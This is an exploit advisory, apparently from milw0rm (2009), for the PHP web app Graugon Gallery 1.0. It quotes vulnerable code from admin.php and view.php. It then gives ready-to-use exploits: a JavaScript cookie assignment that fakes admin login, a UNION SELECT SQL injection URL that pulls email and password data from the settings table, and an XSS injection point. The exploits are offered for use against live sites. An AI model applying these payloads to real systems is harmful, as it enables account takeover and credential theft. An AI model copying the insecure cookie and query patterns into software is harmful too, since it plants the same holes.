@@ -1,0 +1,51 @@
+#########################################################################################
+[0x01] Informations:
+
+Name           : Graugon Gallery  1.0
+Download       : http://www.hotscripts.com/jump.php?listing_id=87617&jump_type=1
+Vulnerability  : Sql Injection/ Insecure Cookie Handling/XSS
+Author         : x0r
+Contact        : andry2000@hotmail.it
+Notes          : Proud to be Italian 
+#########################################################################################
+[0x02] Bug:
+
+Bugged file is /[path]/admin.php
+
+[Code]
+$TwoMonths = 60 * 60 * 24 * 60 + time(); 
+setcookie(g_admin, 1, $TwoMonths);
+[/code]
+
+Bugged file is /[path]/view.php
+
+[Code]
+
+$id = $_GET['id'];
+...
+
+$query = "SELECT * FROM g_gallery WHERE id=$id";
+$result = mysql_query($query);
+[/code]
+
+[Code]
+
+$id = $_GET['id'];
+
+echo "....<a href='view.php?id=" . $id . "'> "
+
+[/code]
+
+
+#########################################################################################
+[0x03] Exploits:
+
+Exploit: 1- javascript:document.cookie ="g_admin=1; path=/"
+         2- http://victim.it/view.php?id=-1337 union select
+0,0,0,concat(email,char(45),password(char45)),0,0 from g_settings--
+		    ( change number of columns)
+		 3- ?id=[XSSCODE]
+
+########################################################################################
+
+# milw0rm.com [2009-02-11]
